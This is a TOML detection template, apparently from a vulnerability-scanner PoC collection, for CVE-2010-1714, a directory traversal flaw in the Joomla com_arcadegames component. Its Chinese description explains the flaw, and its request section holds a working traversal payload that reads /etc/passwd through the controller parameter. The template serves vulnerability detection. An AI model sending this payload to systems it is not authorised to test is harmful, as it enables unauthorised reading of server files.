<toml>
[info]
author = "ave"
description = "检测 Joomla! com_arcadegames 组件目录遍历漏洞。攻击者可通过在 index.php 的 controller 参数中传入 ../ 目录遍历序列读取服务器任意文件（如 /etc/passwd），实现未授权的文件读取。"
id = "POC-AVE-2010-0061"
name = "CVE-2010-1714 目录遍历漏洞 PoC"
severity = "medium"
tags = ["ave-2010-0061"]
vuln_id = [
    "CVE-2010-1714",
    "AVE-2010-0061",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/index.php?option=com_arcadegames&controller=../../../../../../../../../../etc/passwd"
protocol = "http"

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"
